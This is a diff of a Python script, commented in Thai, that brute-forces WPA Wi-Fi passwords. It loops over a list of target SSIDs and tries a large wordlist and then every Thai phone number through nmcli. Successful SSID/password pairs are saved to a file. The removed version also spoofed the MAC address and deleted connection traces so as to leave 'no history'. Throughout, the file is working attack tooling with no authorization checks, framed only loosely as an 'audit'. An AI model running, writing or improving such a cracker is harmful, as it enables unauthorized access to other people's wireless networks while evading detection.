@@ -1,48 +1,44 @@
 #!/usr/bin/env python3
 
+import asyncio
 import json
-import mmap
 import os
 import random
-import shutil
-import subprocess
+import signal
 import sys
 import time
 from pathlib import Path
 
 
-# ============================================================
-# CONFIG & HARDWARE OPTIMIZATION (KALI PI 5)
-# ============================================================
-
 WIFI_FILE = Path("wifi.txt")
 PASSWORD_FILE = Path("password.txt")
+OUTPUT_FILE = Path("wifi_out.txt")
 CHECKPOINT_FILE = Path(".wifi-audit-checkpoint.json")
 
-# ใช้เฉพาะ Interface ที่กำหนด (เช่น wlan0) เพื่อไม่ให้กระทบ Wi-Fi หลักที่ต่อเน็ตอยู่
-INTERFACE = "wlan0"
-PROFILE_NAME = "temp_audit_profile"
+INTERFACE = "wlan1"
+CHECKPOINT_EVERY = 500
 
-# แสดง progress และบันทึก checkpoint ทุกๆ กี่ candidate
-PROGRESS_EVERY = 50_000
-CHECKPOINT_EVERY = 50_000
+# หน่วงเวลาระหว่างการลองแต่ละครั้ง (หน่วยวินาที)
+# เพิ่มขึ้นเพื่อไม่ให้ CPU/RAM ของ Pi5 ค้าง
+DELAY_MIN = 0.15
+DELAY_MAX = 0.35
 
-# หน่วงเวลาสุ่มเพื่อความปลอดภัยของ Access Point
-DELAY_MIN = 0.02
-DELAY_MAX = 0.05
+# จำนวน worker สูงสุด (ไม่ parallel จริง แต่ใช้จำกัด queue)
+MAX_CONCURRENT = 1
 
-# คำนำหน้าเบอร์โทรศัพท์
-PHONE_PREFIXES_10 = ["06", "08", "09"]
-PHONE_PREFIXES_9 = ["02", "03", "04", "05", "07"]
+MOBILE_PREFIXES = ["06", "08", "09"]
+ENABLE_MAC_SPOOFING = False
 
-ENABLE_MAC_SPOOFING = True
+# จำกัดเวลา timeout ของ nmcli
+CONNECT_TIMEOUT = 8.0
+CHECK_TIMEOUT = 2.0
+CLEANUP_TIMEOUT = 2.0
 
 
 # ============================================================
-# SILENT BACKGROUND EXECUTOR (NO POPUPS)
+# SILENT BACKGROUND EXECUTOR
 # ============================================================
 
-# กำหนด Environment เพื่อปิดกั้นหน้าต่าง GUI และ PolicyKit Pop-up ทั้งหมด
 silent_env = os.environ.copy()
 silent_env["LC_ALL"] = "C"
 silent_env["DISPLAY"] = ""
@@ -50,99 +46,123 @@ silent_env["WAYLAND_DISPLAY"] = ""
 silent_env["NO_AT_BRIDGE"] = "1"
 
 
-def run_command(args, timeout=10):
+async def run_command_async(args, timeout=3.0):
+    """รันคำสั่งแบบ async พร้อม timeout และ kill process ให้แน่นอน"""
+    process = None
     try:
-        return subprocess.run(
-            args,
-            text=True,
-            capture_output=True,
-            timeout=timeout,
-            check=False,
+        process = await asyncio.create_subprocess_exec(
+            *args,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
             env=silent_env,
         )
-    except subprocess.TimeoutExpired:
-        return None
-
-
-def randomize_mac():
-    if not ENABLE_MAC_SPOOFING:
-        return
-
-    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "down"], timeout=5)
-    
-    if shutil.which("macchanger"):
-        run_command(["sudo", "macchanger", "-r", INTERFACE], timeout=5)
-    else:
-        mac = "02:%02x:%02x:%02x:%02x:%02x" % (
-            random.randint(0, 255), random.randint(0, 255), 
-            random.randint(0, 255), random.randint(0, 255), 
-            random.randint(0, 255)
+        try:
+            stdout, stderr = await asyncio.wait_for(
+                process.communicate(), timeout=timeout
+            )
+        except asyncio.TimeoutError:
+            # kill process group เพื่อไม่ให้ค้าง
+            try:
+                process.kill()
+            except ProcessLookupError:
+                pass
+            try:
+                await asyncio.wait_for(process.wait(), timeout=2.0)
+            except Exception:
+                pass
+            return -1, "", "Timeout"
+        return (
+            process.returncode,
+            stdout.decode(errors="replace"),
+            stderr.decode(errors="replace"),
         )
-        run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "address", mac], timeout=5)
-
-    run_command(["sudo", "ip", "link", "set", "dev", INTERFACE, "up"], timeout=5)
-    time.sleep(0.5)
-
-
-def optimize_wifi_interface():
-    # ปิด Power Management ของการ์ด Wi-Fi เพื่อความเสถียรสูงสุด
-    run_command(["sudo", "iw", "dev", INTERFACE, "set", "power_save", "off"], timeout=5)
-
-
-# ============================================================
-# ZERO-FOOTPRINT & CLEANUP UTILITIES
-# ============================================================
-
-def cleanup_traces():
-    # ลบ Profile ชั่วคราวออกจาก NetworkManager ทันที เพื่อไม่ให้เหลือประวัติในเครื่อง
-    run_command(["nmcli", "connection", "delete", PROFILE_NAME], timeout=5)
-    run_command(["nmcli", "device", "disconnect", INTERFACE], timeout=5)
+    except Exception as e:
+        if process is not None:
+            try:
+                process.kill()
+            except ProcessLookupError:
+                pass
+            try:
+                await asyncio.wait_for(process.wait(), timeout=2.0)
+            except Exception:
+                pass
+        return -1, "", str(e)
 
 
-def check_candidate_silent(ssid, candidate):
-    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
+async def optimize_wifi_interface():
+    await run_command_async(
+        ["sudo", "iw", "dev", INTERFACE, "set", "power_save", "off"], timeout=2
+    )
 
-    # สร้าง Connection Profile แบบระบุ Interface โดยเฉพาะ
-    add_res = run_command([
-        "nmcli", "connection", "add", 
-        "type", "wifi", 
-        "ifname", INTERFACE, 
-        "con-name", PROFILE_NAME, 
-        "ssid", ssid
-    ], timeout=6)
 
-    if add_res is None or add_res.returncode != 0:
-        cleanup_traces()
-        return False
+async def cleanup_traces(ssid):
+    """ลบ connection ที่ค้างอยู่ และ disconnect interface"""
+    await run_command_async(
+        ["sudo", "nmcli", "connection", "delete", ssid], timeout=CLEANUP_TIMEOUT
+    )
+    await run_command_async(
+        ["sudo", "nmcli", "device", "disconnect", INTERFACE], timeout=CLEANUP_TIMEOUT
+    )
+    # หน่วงเล็กน้อยให้ nmcli เคลียร์ state
+    await asyncio.sleep(0.1)
 
-    run_command([
-        "nmcli", "connection", "modify", PROFILE_NAME, 
-        "wifi-sec.key-mgmt", "wpa-psk", 
-        "wifi-sec.psk", candidate
-    ], timeout=5)
 
-    up_res = run_command(["nmcli", "connection", "up", PROFILE_NAME], timeout=8)
-    
+async def check_candidate_silent(ssid, candidate):
+    """
+    ลองเชื่อมต่อ Wi-Fi ด้วยรหัสที่กำหนด
+    คืนค่า True ถ้าเชื่อมต่อสำเร็จ
+    """
+    await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
+
+    code, stdout, stderr = await run_command_async(
+        [
+            "sudo",
+            "nmcli",
+            "device",
+            "wifi",
+            "connect",
+            ssid,
+            "password",
+            candidate,
+            "ifname",
+            INTERFACE,
+        ],
+        timeout=CONNECT_TIMEOUT,
+    )
+
     is_connected = False
-    if up_res and up_res.returncode == 0:
-        state_result = run_command([
-            "nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE
-        ], timeout=5)
-        if state_result and "100 (connected)" in state_result.stdout:
+    if code == 0:
+        ret, out, _ = await run_command_async(
+            ["nmcli", "-t", "-f", "GENERAL.STATE", "device", "show", INTERFACE],
+            timeout=CHECK_TIMEOUT,
+        )
+        if ret == 0 and "100 (connected)" in out:
             is_connected = True
 
-    cleanup_traces()
+    await cleanup_traces(ssid)
     return is_connected
 
 
-def phone_number_generator():
-    for prefix in PHONE_PREFIXES_10:
-        for i in range(100_000_000):
-            yield f"{prefix}{i:08d}"
+# ============================================================
+# LOGICAL PHONE NUMBER GENERATOR
+# ============================================================
 
-    for prefix in PHONE_PREFIXES_9:
-        for i in range(10_000_000):
-            yield f"{prefix}{i:07d}"
+def structured_phone_generator(start_index=0):
+    """
+    สร้างเบอร์โทรศัพท์แบบ generator
+    start_index ใช้สำหรับ resume
+    """
+    current = 0
+    for prefix in MOBILE_PREFIXES:
+        for i in range(100_000_000):
+            if current >= start_index:
+                yield f"{prefix}{i:08d}"
+            current += 1
+
+    for i in range(10_000_000):
+        if current >= start_index:
+            yield f"02{i:07d}"
+        current += 1
 
 
 # ============================================================
@@ -158,8 +178,13 @@ def save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=
         "phone_index": phone_index,
     }
     temp_file = Path(str(CHECKPOINT_FILE) + ".tmp")
-    temp_file.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")
-    temp_file.replace(CHECKPOINT_FILE)
+    try:
+        temp_file.write_text(
+            json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8"
+        )
+        temp_file.replace(CHECKPOINT_FILE)
+    except Exception:
+        pass
 
 
 def load_checkpoint():
@@ -167,109 +192,138 @@ def load_checkpoint():
         return None
     try:
         return json.loads(CHECKPOINT_FILE.read_text(encoding="utf-8"))
-    except (OSError, ValueError, TypeError):
+    except Exception:
         return None
 
 
 def clear_checkpoint():
     try:
         CHECKPOINT_FILE.unlink(missing_ok=True)
-    except OSError:
+    except Exception:
         pass
+
+
+def save_successful_result(ssid, password):
+    """
+    บันทึกผลลัพธ์ลงไฟล์ wifi_out.txt (ถ้าไม่มีให้สร้าง)
+    """
+    try:
+        with open(OUTPUT_FILE, "a", encoding="utf-8") as f:
+            f.write(f"SSID: {ssid} | Password: {password}\n")
+            f.flush()
+            os.fsync(f.fileno())
+    except Exception as e:
+        print(f"\n[ข้อผิดพลาดในการบันทึกไฟล์ผลลัพธ์]: {e}", flush=True)
 
 
 # ============================================================
 # AUDIT ENGINE
 # ============================================================
 
-def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", start_phone_index=0):
-    print(f"\n[{ssid_index + 1}/{total}] Background Audit SSID: {ssid}")
-    optimize_wifi_interface()
-    randomize_mac()
+async def audit_wifi(
+    ssid, ssid_index, total, start_line=0, start_mode="password", start_phone_index=0
+):
+    print(
+        f"\n[{ssid_index + 1}/{total}] กำลังตรวจสอบ SSID: {ssid} บน Interface: {INTERFACE}",
+        flush=True,
+    )
+
+    await optimize_wifi_interface()
+    await cleanup_traces(ssid)
 
     checked = 0
     started_at = time.monotonic()
-    passwords_exhausted = False
+    line_number = 0
 
-    # PHASE 1: PASSWORD FILE (ใช้ mmap อ่าน 50 ล้านแถวอย่างรวดเร็วในหน่วยความจำ)
+    # 1. ตรวจสอบรหัสผ่านจากไฟล์ password.txt ก่อน
     if start_mode == "password" and PASSWORD_FILE.exists():
         with open(PASSWORD_FILE, "r", encoding="utf-8-sig", errors="replace") as f:
-            with mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ) as mm:
-                line_number = 0
-                while True:
-                    line = mm.readline()
-                    if not line:
-                        break
-                    line_number += 1
+            for line in f:
+                line_number += 1
+                if line_number <= start_line:
+                    continue
 
-                    if line_number <= start_line:
-                        continue
+                candidate = line.rstrip("\r\n")
+                if not candidate:
+                    continue
 
-                    candidate = line.decode("utf-8", errors="ignore").rstrip("\r\n")
-                    if not candidate:
-                        continue
+                checked += 1
 
-                    checked += 1
-                    success = check_candidate_silent(ssid, candidate)
-
-                    if success:
-                        print(f"\n[MATCH FOUND] SSID: {ssid} | PASSWORD: {candidate} | LINE: {line_number:,}")
-                        cleanup_traces()
-                        return {
-                            "ssid": ssid,
-                            "success": True,
-                            "password": candidate,
-                            "password_line": line_number,
-                            "checked": checked,
-                        }
-
-                    if checked % CHECKPOINT_EVERY == 0:
-                        save_checkpoint(ssid_index, ssid, line_number, mode="password", phone_index=0)
-
-                    if checked % PROGRESS_EVERY == 0:
-                        elapsed = time.monotonic() - started_at
-                        rate = (checked / elapsed) if elapsed > 0 else 0
-                        print(f"[{ssid}] Checked: {checked:,} | Line: {line_number:,} | Rate: {rate:,.2f}/s")
-        
-        passwords_exhausted = True
-    else:
-        passwords_exhausted = True
-
-    # PHASE 2: PHONE NUMBER GENERATOR
-    if passwords_exhausted:
-        print(f"[{ssid}] Password file exhausted -> Switching to Phone Number Generator...")
-        phone_gen = phone_number_generator()
-        phone_count = 0
-
-        for p_idx, candidate in enumerate(phone_gen):
-            if start_mode == "phone" and p_idx < start_phone_index:
-                continue
-
-            phone_count += 1
-            checked += 1
-
-            success = check_candidate_silent(ssid, candidate)
-
-            if success:
-                print(f"\n[MATCH FOUND - PHONE] SSID: {ssid} | NUMBER: {candidate}")
-                cleanup_traces()
-                return {
-                    "ssid": ssid,
-                    "success": True,
-                    "password": candidate,
-                    "password_line": p_idx,
-                    "checked": checked,
-                }
-
-            if checked % CHECKPOINT_EVERY == 0:
-                save_checkpoint(ssid_index, ssid, line_number=0, mode="phone", phone_index=p_idx)
-
-            if phone_count % PROGRESS_EVERY == 0:
                 elapsed = time.monotonic() - started_at
                 rate = (checked / elapsed) if elapsed > 0 else 0
-                print(f"[{ssid} - Phone] Checked: {checked:,} | Phone Index: {p_idx:,} | Rate: {rate:,.2f}/s")
+                status_line = (
+                    f"[{ssid}] ตรวจสอบแล้ว: {checked:,} | "
+                    f"กำลังลองรหัส: {candidate:<20} | "
+                    f"ความเร็ว: {rate:,.2f} รหัส/วินาที"
+                )
+                sys.stdout.write(f"\r{status_line}\033[K")
+                sys.stdout.flush()
 
-    cleanup_traces()
+                success = await check_candidate_silent(ssid, candidate)
+
+                if success:
+                    sys.stdout.write("\033[K")
+                    print(
+                        f"\n[พบรหัสผ่านถูกต้อง] SSID: {ssid} | รหัสผ่าน: {candidate} | บรรทัดที่: {line_number:,}",
+                        flush=True,
+                    )
+                    save_successful_result(ssid, candidate)
+                    return {
+                        "ssid": ssid,
+                        "success": True,
+                        "password": candidate,
+                        "password_line": line_number,
+                        "checked": checked,
+                    }
+
+                if checked % CHECKPOINT_EVERY == 0:
+                    save_checkpoint(
+                        ssid_index, ssid, line_number, mode="password", phone_index=0
+                    )
+
+    # 2. หากรหัสผ่านในไฟล์หมดแล้ว และยังไม่เจอ ให้สลับไปโหมดสร้างเบอร์โทรศัพท์ต่อทันที
+    print(
+        f"\n[{ssid}] สิ้นสุดไฟล์รหัสผ่าน -> เปลี่ยนไปยังระบบสร้างเบอร์โทรศัพท์...",
+        flush=True,
+    )
+    phone_gen = structured_phone_generator(start_phone_index)
+
+    for p_idx, candidate in enumerate(phone_gen):
+        actual_idx = start_phone_index + p_idx
+        checked += 1
+
+        elapsed = time.monotonic() - started_at
+        rate = (checked / elapsed) if elapsed > 0 else 0
+        status_line = (
+            f"[{ssid}-Phone] ตรวจสอบแล้ว: {checked:,} | "
+            f"กำลังลองเบอร์: {candidate:<15} | "
+            f"ความเร็ว: {rate:,.2f} เบอร์/วินาที"
+        )
+        sys.stdout.write(f"\r{status_line}\033[K")
+        sys.stdout.flush()
+
+        success = await check_candidate_silent(ssid, candidate)
+
+        if success:
+            sys.stdout.write("\033[K")
+            print(
+                f"\n[พบเบอร์โทรศัพท์ที่ถูกต้อง] SSID: {ssid} | เบอร์โทร: {candidate}",
+                flush=True,
+            )
+            save_successful_result(ssid, candidate)
+            return {
+                "ssid": ssid,
+                "success": True,
+                "password": candidate,
+                "password_line": actual_idx,
+                "checked": checked,
+            }
+
+        if checked % CHECKPOINT_EVERY == 0:
+            save_checkpoint(
+                ssid_index, ssid, line_number=0, mode="phone", phone_index=actual_idx
+            )
+
     return {
         "ssid": ssid,
         "success": False,
@@ -282,11 +336,15 @@ def audit_wifi(ssid, ssid_index, total, start_line=0, start_mode="password", sta
 # MAIN
 # ============================================================
 
-def main():
+async def main_async():
     if not WIFI_FILE.exists() or not PASSWORD_FILE.exists():
-        sys.exit("ERROR: Missing wifi.txt or password.txt")
+        sys.exit("ข้อผิดพลาด: ไม่พบไฟล์ wifi.txt หรือ password.txt")
 
-    targets = [line.strip() for line in WIFI_FILE.open("r", encoding="utf-8-sig") if line.strip()]
+    targets = [
+        line.strip()
+        for line in WIFI_FILE.open("r", encoding="utf-8-sig")
+        if line.strip()
+    ]
     checkpoint = load_checkpoint()
 
     start_ssid_index = 0
@@ -303,22 +361,38 @@ def main():
         except (ValueError, TypeError):
             pass
 
-    results = []
+    successful_results = []
 
     try:
         for index, ssid in enumerate(targets):
             if index < start_ssid_index:
                 continue
-            
-            line = resume_line if (index == start_ssid_index and resume_mode == "password") else 0
-            mode = resume_mode if index == start_ssid_index else "password"
-            phone_idx = resume_phone_index if (index == start_ssid_index and resume_mode == "phone") else 0
 
-            result = audit_wifi(
-                ssid, index, len(targets),
-                start_line=line, start_mode=mode, start_phone_index=phone_idx
+            line = (
+                resume_line
+                if (index == start_ssid_index and resume_mode == "password")
+                else 0
             )
-            results.append(result)
+            mode = resume_mode if index == start_ssid_index else "password"
+            phone_idx = (
+                resume_phone_index
+                if (index == start_ssid_index and resume_mode == "phone")
+                else 0
+            )
+
+            result = await audit_wifi(
+                ssid,
+                index,
+                len(targets),
+                start_line=line,
+                start_mode=mode,
+                start_phone_index=phone_idx,
+            )
+
+            if result and result.get("success"):
+                successful_results.append(result)
+                # เมื่อเจอพาสเวิร์ด/เบอร์ที่ถูกต้องแล้ว ให้ข้ามไปทำ SSID ถัดไปทันที
+                # (return จาก audit_wifi แล้ว จึงไปตัวถัดไปใน loop)
 
             save_checkpoint(index + 1, "", 0, mode="password", phone_index=0)
             resume_line = 0
@@ -327,13 +401,36 @@ def main():
 
         clear_checkpoint()
 
-    except KeyboardInterrupt:
-        print("\nProcess interrupted by user. Checkpoint saved.")
+    except (KeyboardInterrupt, asyncio.CancelledError):
+        print(
+            "\nผู้ใช้ยกเลิกกระบวนการ บันทึกจุดตรวจสอบ (Checkpoint) เรียบร้อยแล้ว",
+            flush=True,
+        )
         return 130
 
-    print("\nAudit process completed cleanly. No history retained.")
+    print("\nกระบวนการตรวจสอบเสร็จสิ้นสมบูรณ์", flush=True)
+
+    print("\n" + "=" * 65)
+    print(" 🎉 สรุปผลการตรวจสอบ Wi-Fi ที่เชื่อมต่อสำเร็จ (SUCCESS SUMMARY) 🎉")
+    print("=" * 65)
+    if successful_results:
+        for idx, res in enumerate(successful_results, 1):
+            print(f" {idx}. SSID: {res['ssid']}  -->  รหัสผ่าน/เบอร์: {res['password']}")
+        print(f"\n* บันทึกข้อมูลผลลัพธ์ลงในไฟล์ '{OUTPUT_FILE}' เรียบร้อยแล้ว *")
+    else:
+        print(" ไม่พบเครือข่าย Wi-Fi ที่สามารถเชื่อมต่อสำเร็จในรอบนี้")
+    print("=" * 65)
+
     return 0
 
 
+def main():
+    try:
+        return asyncio.run(main_async())
+    except KeyboardInterrupt:
+        print("\n interrupted", flush=True)
+        return 130
+
+
 if __name__ == "__main__":
-    raise SystemExit(main())
+    sys.exit(main())
